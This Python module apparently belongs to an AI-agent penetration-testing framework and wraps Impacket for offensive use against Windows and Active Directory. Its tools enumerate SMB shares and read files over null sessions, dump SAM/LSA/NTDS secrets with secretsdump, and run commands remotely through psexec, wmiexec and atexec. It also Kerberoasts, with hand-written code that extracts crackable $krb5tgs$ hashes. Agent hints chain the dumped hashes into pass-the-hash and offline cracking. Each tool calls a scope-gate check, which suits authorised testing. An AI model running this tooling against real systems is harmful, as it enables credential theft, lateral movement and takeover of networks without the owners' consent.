# Impacket suite: SMB enumeration plus Windows remote-exec and secret dumping.
#
# Two categories of tools, both BRAIN_DISPATCH:
#
# 1. Programmatic SMB (works against Samba AND Windows):
#    - smb_enum_shares  - list shares and probe read access
#    - smb_read_file    - read a file from an accessible share
#
# 2. Impacket example-script wrappers (subprocess, argv - never a shell):
#    - secretsdump   - dump SAM/LSA/NTDS secrets   (Windows targets)
#    - psexec_exec   - run one command via RemCom   (Windows targets)
#    - wmiexec_exec  - run one command via WMI     (Windows targets)
#    - atexec_exec   - run one command via the Task Scheduler (Windows)
#
# The wrappers invoke impacket console scripts with an argv list and
# shell=False, so target/credential values are never interpolated into a
# shell. -no-pass is added when no password is supplied so impacket never
# blocks on an interactive password prompt (which would hang a dispatch
# worker thread). stdin is wired to DEVNULL for the same reason.
#
# All functions are deliberately synchronous: both dispatchers run sync
# tools in a worker thread (run_in_executor / asyncio.to_thread). Making
# these async would pin blocking subprocess / socket calls to the loop.
#
# TARGET COMPATIBILITY: remote-exec and secretsdump target Windows
# services (Service Control Manager, WMI, Task Scheduler, the SAM/SYSTEM
# hives). They do NOT work against Samba-only hosts such as
# Metasploitable2; against Samba they fail with a protocol error. The
# programmatic SMB tools DO work against Samba - those are the winnable
# steps on a Samba target.
#
# NOTE: this is a comment block, not a module docstring, so the static
# discovery pass does not mint a no-op LOCAL_FILE manifest for the file.



import os
import shlex
import shutil
import subprocess
import sys

from constants import framework_tool
from impacket.smb import FILE_READ_DATA, FILE_SHARE_READ
from impacket.smbconnection import SMBConnection


# --- script resolver (sudo / venv-bin gap) --------------------------------
#
# The framework runs under root (sudo), where the venv's bin/ directory is
# NOT on $PATH (sudo's env_reset strips it).  shutil.which('GetUserSPNs.py')
# returns None under root even though the script exists in the venv bin.
# This resolver closes that gap by checking, in order:
#   1. The venv's own bin/ directory (sys.executable's parent)
#   2. Kali's system impacket examples (/usr/share/doc/python3-impacket/examples/)
#   3. shutil.which (PATH — works when not under sudo, or if the operator
#      sourced the venv activate script first)
#   4. The bare script name (last resort — lets subprocess produce a clear
#      FileNotFoundError message)
#
# This fixes the pre-existing gap for ALL impacket wrappers (secretsdump,
# psexec, wmiexec, atexec) — they all hit the same shutil.which-or-bare
# pattern.  The venv bin check is the key: the scripts are installed there
# by pip (entry_points), and sys.executable always points at the venv's
# python regardless of who's running it.

_VENV_BIN = os.path.dirname(sys.executable)
_SYSTEM_EXAMPLES = "/usr/share/doc/python3-impacket/examples"


def _resolve_impacket_script(script: str) -> str:
    """Resolve an impacket example script to an absolute path.

    Checks the venv bin, Kali's system examples dir, and PATH in order.
    Returns the first match, or the bare script name as a last resort.
    """
    # 1. venv bin (the pip-installed entry_points live here)
    candidate = os.path.join(_VENV_BIN, script)
    if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
        return candidate
    # 2. Kali system examples (apt-installed python3-impacket)
    candidate = os.path.join(_SYSTEM_EXAMPLES, script)
    if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
        return candidate
    # 3. PATH (works when the venv is activated or under a non-sudo shell)
    found = shutil.which(script)
    if found:
        return found
    # 4. last resort — let subprocess surface the FileNotFoundError
    return script


# --- shared helpers ------------------------------------------------------

def _target_string(target, username, password, domain):
    """Build impacket's [[domain/]username[:password]@]<target> arg."""
    if not username:
        # anonymous / null session: bare address (caller adds -no-pass)
        return target
    user = f"{domain}/{username}" if domain else username
    if password:
        return f"{user}:{password}@{target}"
    return f"{user}@{target}"


def _impacket_argv(script, target, command, username, password, domain, extra):
    """Build the argv list for an impacket example script (no shell)."""
    binary = _resolve_impacket_script(script)
    argv = [binary]
    # Always avoid an interactive password prompt that would hang the worker.
    if not password:
        argv.append("-no-pass")
    if extra:
        argv.extend(shlex.split(extra))
    argv.append(_target_string(target, username, password, domain))
    if command:
        argv.extend(shlex.split(command) if isinstance(command, str) else list(command))
    return argv


def _run_impacket(argv, timeout=300):
    """Run an impacket script with stdin closed; never raise to the caller."""
    try:
        result = subprocess.run(
            argv,
            capture_output=True,
            text=True,
            timeout=timeout,
            stdin=subprocess.DEVNULL,
        )
        if result.returncode == 0:
            return result.stdout
        # Non-zero exit still carries useful output (e.g. protocol errors
        # against Samba). Surface both streams so the operator can diagnose.
        return f"{result.stdout}\n[{argv[0]} exit {result.returncode}] {result.stderr}".strip()
    except subprocess.TimeoutExpired:
        return f"{argv[0]} timed out after {timeout}s"
    except FileNotFoundError:
        return f"{argv[0]} not found; install impacket in the framework venv"
    except Exception as e:
        return f"Error running {argv[0]}: {e}"


# --- programmatic SMB (works on Samba) -----------------------------------

@framework_tool("Enumerate SMB shares on a target and report read access for each (works against Samba and Windows).")
def smb_enum_shares(target, username="", password="", domain=""):
    """List SMB shares on a target and probe read access for each.

    Uses a null (anonymous) session when username is empty, otherwise logs
    in with the supplied credentials. Works against both Windows SMB and
    Samba - this is the winnable impacket step on a Samba target like
    Metasploitable2.

    Args:
        target: IP or hostname of the SMB host.
        username: SMB username; empty for anonymous / null session.
        password: SMB password; empty for null session.
        domain: Windows domain (ignored by most Samba setups).
    """
    from utils.scope_gate import check_scan, ScopeGateError
    _sc_ok, _sc_reason = check_scan(target)
    if not _sc_ok:
        raise ScopeGateError(f"scope gate: {_sc_reason}")

    try:
        # Positional-only construction (remoteName, remoteHost) — the
        # proven-working pattern (same as smb_scanner.check_null_session).
        # NEVER pass remoteName=/remoteByName= as kwargs: remoteByName
        # doesn't exist in impacket (TypeError), and remoteName=False
        # collides with the first positional (TypeError "multiple values").
        # Both variants shipped here historically and both TypeErrored.
        conn = SMBConnection(target, target, timeout=10)
        if username:
            conn.login(username, password, domain)
        else:
            conn.login("", "")  # null session
        shares = conn.listShares()
        lines = []
        for share in shares:
            name = share.get("shi1_netname", "").rstrip("\x00")
            remark = share.get("shi1_remark", "").rstrip("\x00")
            access = "no-access"
            try:
                tid = conn.connectTree(name)
                access = "read"
                conn.disconnectTree(tid)
            except Exception:
                pass
            lines.append(f"{name}\tremark={remark!r}\t[{access}]")
        conn.logoff()
        return "\n".join(lines) if lines else f"No shares enumerated on {target}."
    except Exception as e:
        return f"SMB enumeration error: {e}"


@framework_tool("Read a file from an SMB share on a target (works against Samba and Windows).")
def smb_read_file(target, share, path, username="", password="", domain="", max_bytes=65536):
    """Read a single file from an SMB share.

    Returns up to max_bytes of the file as decoded text (utf-8, replace).
    Use smb_enum_shares first to find a readable share.

    Args:
        target: IP or hostname of the SMB host.
        share: Share name (e.g. "C$" or a Samba share like "tmp").
        path: Path to the file within the share (e.g. "etc/passwd").
        username: SMB username; empty for anonymous / null session.
        password: SMB password; empty for null session.
        domain: Windows domain.
        max_bytes: Cap on bytes read so a huge file can't drown the chat.
    """
    from utils.scope_gate import check_scan, ScopeGateError
    _sc_ok, _sc_reason = check_scan(target)
    if not _sc_ok:
        raise ScopeGateError(f"scope gate: {_sc_reason}")

    try:
        # Positional-only construction — see the note in smb_enum_shares:
        # remoteName=False as a kwarg TypeErrors ("multiple values") because
        # the first positional already fills remoteName.
        conn = SMBConnection(target, target, timeout=10)
        if username:
            conn.login(username, password, domain)
        else:
            conn.login("", "")
        tid = conn.connectTree(share)
        fid = conn.openFile(
            tid,
            path,
            desiredAccess=FILE_READ_DATA,
            shareMode=FILE_SHARE_READ,
        )
        offset = 0
        chunks = []
        total = 0
        while total < max_bytes:
            data = conn.readFile(tid, fid, offset, 8192)
            if not data:
                break
            chunks.append(data)
            total += len(data)
            offset += len(data)
        conn.closeFile(tid, fid)
        conn.disconnectTree(tid)
        conn.logoff()
        body = b"".join(chunks).decode("utf-8", errors="replace")
        if total >= max_bytes:
            body += f"\n...[truncated at {max_bytes} bytes]"
        return body or "(empty file)"
    except Exception as e:
        return f"SMB read error: {e}"


# --- impacket example-script wrappers (Windows targets) ------------------

@framework_tool(
    "Dump SAM/LSA/NTDS secrets from a Windows target using impacket's secretsdump.",
    next_hints=["psexec_exec with -hashes :<NTLM>", "report_finding"],
)
def secretsdump(target, username="", password="", domain="", extra_options=""):
    """Run impacket secretsdump.py against a Windows target.

    Dumps local SAM hashes, LSA secrets, and (against a DC) NTDS hashes.
    Remote mode requires Windows (a real SAM/registry); against a Samba host
    it will fail with a protocol error - that is expected, not a bug.

    Args:
        target: Windows host IP/hostname.
        username: Account with local-admin or DC rights on the target.
        password: Account password (empty -> -no-pass, used with hashes/kerb).
        domain: Windows domain.
        extra_options: Extra secretsdump flags, e.g. "-just-dc -hashes :NTLM".
    """
    from utils.scope_gate import check_scan, ScopeGateError
    _sc_ok, _sc_reason = check_scan(target)
    if not _sc_ok:
        raise ScopeGateError(f"scope gate: {_sc_reason}")
    argv = _impacket_argv("secretsdump.py", target, None, username, password, domain, extra_options)
    return _run_impacket(argv, timeout=600)


@framework_tool("Run a single command on a Windows target via impacket psexec (RemCom service).")
def psexec_exec(target, command, username="", password="", domain="", extra_options=""):
    """Run one command on a Windows target via impacket's psexec.py.

    Installs a temporary service via the Service Control Manager, executes
    the command, and returns captured stdout. Requires a Windows target
    with SMB and SCM; against Sama it fails (Samba has no SCM).

    Args:
        target: Windows host IP/hostname.
        command: The command to execute on the target (e.g. "whoami" or "ipconfig /all").
        username: Windows account with local-admin rights.
        password: Account password (empty -> -no-pass).
        domain: Windows domain.
        extra_options: Extra psexec flags, e.g. "-service-name X".
    """
    from utils.scope_gate import check_scan, ScopeGateError
    _sc_ok, _sc_reason = check_scan(target)
    if not _sc_ok:
        raise ScopeGateError(f"scope gate: {_sc_reason}")
    if not command:
        return "psexec_exec requires a command."
    argv = _impacket_argv("psexec.py", target, command, username, password, domain, extra_options)
    return _run_impacket(argv, timeout=300)


@framework_tool("Run a single command on a Windows target via WMI (impacket wmiexec).")
def wmiexec_exec(target, command, username="", password="", domain="", extra_options=""):
    """Run one command on a Windows target via impacket's wmiexec.py.

    Uses Windows Management Instrumentation (no service install). Requires
    a Windows target with WMI enabled; against Samba it fails.

    Args:
        target: Windows host IP/hostname.
        command: The command to execute on the target.
        username: Windows account.
        password: Account password (empty -> -no-pass).
        domain: Windows domain.
        extra_options: Extra wmiexec flags, e.g. "-silentcommand".
    """
    from utils.scope_gate import check_scan, ScopeGateError
    _sc_ok, _sc_reason = check_scan(target)
    if not _sc_ok:
        raise ScopeGateError(f"scope gate: {_sc_reason}")
    if not command:
        return "wmiexec_exec requires a command."
    argv = _impacket_argv("wmiexec.py", target, command, username, password, domain, extra_options)
    return _run_impacket(argv, timeout=300)


@framework_tool("Run a single command on a Windows target via the Task Scheduler (impacket atexec).")
def atexec_exec(target, command, username="", password="", domain="", extra_options=""):
    """Run one command on a Windows target via impacket's atexec.py.

    Schedules a one-shot task via the Task Scheduler service and captures
    output. Requires a Windows target with the Task Scheduler service;
    against Samba it fails.

    Args:
        target: Windows host IP/hostname.
        command: The command to execute on the target.
        username: Windows account.
        password: Account password (empty -> -no-pass).
        domain: Windows domain.
        extra_options: Extra atexec flags, e.g. "-session-id 1".
    """
    from utils.scope_gate import check_scan, ScopeGateError
    _sc_ok, _sc_reason = check_scan(target)
    if not _sc_ok:
        raise ScopeGateError(f"scope gate: {_sc_reason}")
    if not command:
        return "atexec_exec requires a command."
    argv = _impacket_argv("atexec.py", target, command, username, password, domain, extra_options)
    return _run_impacket(argv, timeout=300)


# --- Active Directory: Kerberoasting (TGS extraction) --------------------
#
# Kerberoasting is the classic AD attack: request service tickets (TGS) for
# accounts that have a servicePrincipalName (SPN), then crack the encrypted
# ticket offline to recover the account's password.  impacket ships two
# paths for this:
#
#   1. GetUserSPNs.py  — the high-level example script: LDAP-enumerates all
#      SPN-bearing accounts, optionally requests a TGS for each, and outputs
#      them in $krb5tgs$ John/hashcat hash format.  This is what you want
#      when you have valid domain creds and want to find+roast SPN accounts
#      in one shot.
#
#   2. impacket.krb5.kerberosv5.getKerberosTGS — the low-level programmatic
#      primitive: given a TGT (obtained via getKerberosTGT) and an SPN,
#      request a single TGS.  This is what you want when you already know
#      the SPN you want to roast and don't need the LDAP enumeration step.
#
# Both tools produce $krb5tgs$ hashes ready for run_john / run_hashcat
# (hash mode 13100 for hashcat, "krb5tgs" format for john).
#
# NOTE on target format: GetUserSPNs.py takes `domain/username[:password]`
# as its positional (NOT `user:pass@target` like the other impacket
# wrappers — the DC IP is a separate -dc-ip flag).  We handle this
# difference in the wrapper below.
#
# Auth options: password, NTLM hashes (LM:NT via -hashes), AES key (-aesKey),
# or Kerberos ticket (-k with KRB5CCNAME).  The tool mirrors the impacket
# script's own auth group so the operator can pick the right credential
# shape for their access level.


def _getuserspns_argv(target, username, password, domain, dc_ip,
                      request_all, request_user, extra, output_file=""):
    """Build the argv for GetUserSPNs.py (different target format from the
    other impacket wrappers — no @target, the DC IP is -dc-ip)."""
    binary = _resolve_impacket_script("GetUserSPNs.py")
    argv = [binary]

    if not password:
        argv.append("-no-pass")

    # Request mode: -request (all SPN users), -request-user (one SPN user),
    # or neither (enumerate only).
    if request_all:
        argv.append("-request")
    if request_user:
        argv.extend(["-request-user", request_user])
    if output_file:
        argv.extend(["-outputfile", output_file])

    if dc_ip:
        argv.extend(["-dc-ip", dc_ip])

    if extra:
        argv.extend(shlex.split(extra))

    # Positional: domain/username[:password] (no @target — the DC IP is -dc-ip)
    if username:
        user = f"{domain}/{username}" if domain else username
        if password:
            argv.append(f"{user}:{password}")
        else:
            argv.append(user)
    elif domain:
        # anonymous LDAP bind (rare, usually fails on AD but the script supports it)
        argv.append(f"{domain}/")
    else:
        argv.append(target)

    return argv


@framework_tool(
    "Kerberoasting: enumerate SPN-bearing accounts in an Active Directory "
    "domain and request TGS (service) tickets for them, outputting the "
    "tickets in $krb5tgs$ crackable hash format (John the Ripper / hashcat "
    "mode 13100). Uses impacket's GetUserSPNs.py — the canonical AD "
    "kerberoasting tool. Requires valid domain credentials (password, NTLM "
    "hashes, AES key, or Kerberos ticket). Pass request=True to request TGS "
    "for ALL SPN users found, or request_user='username' for a single user. "
    "The returned hashes go straight to run_john (format: krb5tgs) or "
    "run_hashcat (mode 13100) for offline cracking. This is the direct "
    "credential lane: you already have domain access and want to extract "
    "crackable tickets from SPN accounts.",
    next_hints=["run_john", "run_hashcat", "report_finding"],
    tags=["net.services"],
)
def kerberoast(
    target,
    username="",
    password="",
    domain="",
    dc_ip="",
    request=True,
    request_user="",
    output_file="",
    extra_options="",
):
    """Enumerate SPN accounts and/or request TGS tickets via GetUserSPNs.py.

    With ``request=True`` (default), requests a TGS for every SPN-bearing
    account found via LDAP and outputs each as a ``$krb5tgs$`` hash.  With
    ``request_user`` set, requests a TGS for just that one user.  With
    neither, only enumerates the SPN accounts (no tickets requested).

    The target format differs from the other impacket wrappers: the
    positional is ``domain/username[:password]`` (no ``@target``) and the
    DC IP is passed via ``-dc-ip``.  This wrapper handles that for you.

    Args:
        target: The domain name (e.g. ``CORP.LOCAL``) or the DC IP.  When
            ``domain`` is set this is used as the DC IP fallback.
        username: Domain username with valid domain creds.
        password: Domain password (empty with -hashes/-aesKey/-k).
        domain: The AD domain name (e.g. ``CORP.LOCAL``).
        dc_ip: IP of the domain controller (optional; defaults to DNS).
        request: If True, request TGS for ALL SPN users found (default).
        request_user: Request a TGS for a single SPN user (mutually
            exclusive with request=True — if set, request is ignored).
        output_file: Save hashes to this file instead of (or in addition
            to) stdout.
        extra_options: Extra GetUserSPNs.py flags, e.g.
            ``"-hashes :31d6cfe0d16ae931b73c59d7e0c089c0"`` for pass-the-hash,
            ``"-aesKey <hex>"``, ``"-k"`` for Kerberos auth, ``"-stealth"``,
            ``"-machine-only"``.
    """
    from utils.scope_gate import check_scan, ScopeGateError

    # Scope-gate the DC IP (the actual target we're talking to).  Fall back
    # to the domain/target arg if dc_ip is unset — the script will resolve
    # it via DNS, but the gate should still have a chance to check.
    gate_target = dc_ip or target or domain
    _sc_ok, _sc_reason = check_scan(gate_target)
    if not _sc_ok:
        raise ScopeGateError(f"scope gate: {_sc_reason}")

    argv = _getuserspns_argv(
        target, username, password, domain, dc_ip,
        request_all=request and not request_user,
        request_user=request_user,
        extra=extra_options,
        output_file=output_file,
    )
    raw = _run_impacket(argv, timeout=300)

    # Triage the output: separate the SPN enumeration table from the hash
    # lines so the secretary can pick up the hashes cleanly for cracking.
    lines = raw.splitlines() if raw else []
    hashes = [ln for ln in lines if ln.startswith("$krb5tgs$")]
    spn_lines = [
        ln for ln in lines
        if ln.strip() and not ln.startswith("$") and not ln.startswith("[")
    ]

    result = {
        "status": "Success" if hashes or spn_lines else "Failed",
        "raw_output": raw,
        "spn_accounts": spn_lines,
        "tgs_hashes": hashes,
        "hash_count": len(hashes),
        "note": (
            "TGS hashes in $krb5tgs$ format — crack with run_john (format: "
            "krb5tgs) or run_hashcat (mode 13100). SPN accounts enumerated "
            "above; hashes below. If hash_count is 0 and spn_accounts is "
            "non-empty, the SPNs exist but no TGS was requested (pass "
            "request=True) or the account has no SPN set."
        ),
    }
    if hashes:
        result["next_step_hint"] = (
            "Crack the TGS hashes: call execute_tool with tool_id "
            "'payloads.hash_crack.run_john' or 'payloads.hash_crack.run_hashcat', "
            "passing the hashes (one per line) or writing them to a file first."
        )
    return result


@framework_tool(
    "Request a single Kerberos TGS (service ticket) for a specific SPN "
    "using impacket's programmatic Kerberos API (getKerberosTGT + "
    "getKerberosTGS), without the LDAP enumeration step. Returns the "
    "$krb5tgs$ crackable hash. This is the low-level primitive when you "
    "already know the SPN you want to roast (e.g. 'HTTP/web.corp.local', "
    "CIFS/fileserver, MSSQLSvc/db.corp.local). Auth via password or NTLM "
    "hashes. The hash goes straight to run_john / run_hashcat. Unlike "
    "kerberoast (which uses LDAP to find SPN accounts), this tool talks "
    "directly to the KDC — no LDAP needed.",
    next_hints=["run_john", "run_hashcat", "report_finding"],
    tags=["net.services"],
)
def request_tgs(
    spn,
    domain,
    username,
    password="",
    dc_ip="",
    hashes="",
    aes_key="",
):
    """Request a single TGS for a specific SPN via the Kerberos API.

    Obtains a TGT (using the provided credentials), then requests a TGS
    for the given SPN, and extracts the ``$krb5tgs$`` crackable hash from
    the ticket.  No LDAP enumeration — you must know the SPN already.

    Args:
        spn: The servicePrincipalName to request a ticket for, e.g.
            ``"HTTP/web.corp.local"``, ``"CIFS/fileserver.corp.local"``,
            ``"MSSQLSvc/db.corp.local:1433"``.
        domain: The AD domain (realm), e.g. ``"CORP.LOCAL"``.
        username: Domain username to authenticate as.
        password: Domain password (empty when using hashes/aes_key).
        dc_ip: IP of the domain controller / KDC (optional; defaults to DNS).
        hashes: NTLM hashes as ``"LM:NT"`` hex (e.g.
            ``"aad3b435b51404eeaad3b435b51404ee:31d6..."``) for pass-the-hash.
        aes_key: AES key hex for Kerberos AES auth (alternative to hashes).
    """
    from utils.scope_gate import check_scan, ScopeGateError
    from binascii import hexlify
    from pyasn1.codec.der import decoder as asn1_decoder

    gate_target = dc_ip or domain
    _sc_ok, _sc_reason = check_scan(gate_target)
    if not _sc_ok:
        raise ScopeGateError(f"scope gate: {_sc_reason}")

    try:
        from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
        from impacket.krb5 import constants
        from impacket.krb5.asn1 import TGS_REP
        from impacket.krb5.types import Principal
        from impacket.ntlm import compute_lmhash, compute_nthash
    except ImportError as exc:
        return {
            "status": "Failed",
            "error": f"impacket Kerberos modules unavailable: {exc}",
        }

    # Parse hashes if provided (LM:NT format).
    lmhash = ""
    nthash = ""
    if hashes:
        parts = hashes.split(":")
        if len(parts) == 2:
            lmhash, nthash = parts
        elif len(parts) == 1:
            nthash = parts[0]

    # Build the client principal.
    try:
        userName = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    except Exception as exc:
        return {"status": "Failed", "error": f"failed to build principal: {exc}"}

    # Step 1: obtain a TGT.
    # getKerberosTGT returns a 4-tuple (tgt, cipher, key, sessionKey) on
    # the normal path, but a 3-tuple (tgt, None, key, None) on the rc4
    # fallback path — handle both so a tuple-size mismatch doesn't kill
    # the call on an older/newer impacket.
    kdc = dc_ip if dc_ip else None
    try:
        tgt_result = getKerberosTGT(
            userName, password, domain, lmhash, nthash, aes_key, kdc
        )
        if len(tgt_result) == 4:
            tgt, cipher, _, sessionKey = tgt_result
        else:
            tgt, cipher, sessionKey = tgt_result[:3]
    except Exception as exc:
        return {
            "status": "Failed",
            "error": f"TGT request failed (check creds/domain/DC): {exc}",
            "username": username,
            "domain": domain,
            "dc_ip": dc_ip or "(DNS)",
        }

    # Step 2: request a TGS for the SPN.
    # getKerberosTGS returns a 4-tuple (tgs, cipher, sessionKey, newSessionKey).
    try:
        serverName = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
        tgs, _, _, _ = getKerberosTGS(
            serverName, domain, kdc, tgt, cipher, sessionKey
        )
    except Exception as exc:
        return {
            "status": "Failed",
            "error": f"TGS request failed for SPN {spn!r}: {exc}",
            "username": username,
            "domain": domain,
            "spn": spn,
        }

    # Step 3: extract the $krb5tgs$ hash from the ticket (same logic as
    # GetUserSPNs.py:outputTGS — the etype determines the checksum split).
    try:
        decodedTGS = asn1_decoder.decode(tgs, asn1Spec=TGS_REP())[0]
        etype = decodedTGS["ticket"]["enc-part"]["etype"]
        cipher_bytes = decodedTGS["ticket"]["enc-part"]["cipher"].asOctets()
        realm = str(decodedTGS["ticket"]["realm"])
        spn_escaped = spn.replace(":", "~")

        etype_map = {
            constants.EncryptionTypes.rc4_hmac.value: "rc4",
            constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value: "aes128",
            constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value: "aes256",
            constants.EncryptionTypes.des_cbc_md5.value: "des",
        }

        if etype == constants.EncryptionTypes.rc4_hmac.value:
            # RC4-HMAC: first 16 bytes = checksum, rest = data
            entry = "$krb5tgs$%d$*%s$%s$%s*$%s$%s" % (
                etype, username, realm, spn_escaped,
                hexlify(cipher_bytes[:16]).decode(),
                hexlify(cipher_bytes[16:]).decode(),
            )
        elif etype in (constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value,
                       constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value):
            # AES: last 12 bytes = checksum, rest = data
            entry = "$krb5tgs$%d$%s$%s$*%s*$%s$%s" % (
                etype, username, realm, spn_escaped,
                hexlify(cipher_bytes[-12:]).decode(),
                hexlify(cipher_bytes[:-12]).decode(),
            )
        elif etype == constants.EncryptionTypes.des_cbc_md5.value:
            entry = "$krb5tgs$%d$*%s$%s$%s*$%s$%s" % (
                etype, username, realm, spn_escaped,
                hexlify(cipher_bytes[:16]).decode(),
                hexlify(cipher_bytes[16:]).decode(),
            )
        else:
            return {
                "status": "Failed",
                "error": f"unsupported encryption type {etype} for SPN {spn!r}",
                "supported_etypes": list(etype_map.values()),
            }
    except Exception as exc:
        return {
            "status": "Failed",
            "error": f"failed to extract hash from TGS: {exc}",
            "spn": spn,
        }

    return {
        "status": "Success",
        "spn": spn,
        "username": username,
        "domain": domain,
        "realm": realm,
        "encryption_type": etype_map.get(etype, f"etype-{etype}"),
        "tgs_hash": entry,
        "hash_count": 1,
        "note": (
            "TGS hash in $krb5tgs$ format — crack with run_john (format: "
            "krb5tgs) or run_hashcat (mode 13100)."
        ),
        "next_step_hint": (
            "Crack the TGS hash: call execute_tool with tool_id "
            "'payloads.hash_crack.run_john' or 'payloads.hash_crack.run_hashcat', "
            "passing the tgs_hash value."
        ),
    }
